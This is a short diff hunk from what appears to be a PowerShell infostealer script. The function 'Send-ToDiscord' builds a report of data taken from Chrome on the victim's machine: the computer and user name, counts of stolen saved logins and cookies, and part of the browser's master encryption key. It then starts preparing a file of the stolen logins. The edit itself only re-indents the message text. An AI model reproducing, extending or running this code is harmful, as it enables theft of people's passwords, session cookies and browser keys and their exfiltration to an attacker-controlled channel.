@@ -566,13 +566,13 @@ function Send-ToDiscord {
     $username = $env:USERNAME
     
     # ─── Monta mensagem ───
-    $summary = @"
-    **Chrome Data Extract - $computer**
-    User: `$username`
-    Method: `$Method`
-    Logins: `$($Logins.Count)`
-    Cookies: `$($Cookies.Count)`
-    Key: `$($MasterKeyB64.Substring(0, [Math]::Min(40, $MasterKeyB64.Length)))...`
+$summary = @"
+**Chrome Data Extract - $computer**
+User: `$username`
+Method: `$Method`
+Logins: `$($Logins.Count)`
+Cookies: `$($Cookies.Count)`
+Key: `$($MasterKeyB64.Substring(0, [Math]::Min(40, $MasterKeyB64.Length)))...`
 "@
     # ─── Prepara arquivo de logins ───
     $loginLines = @()
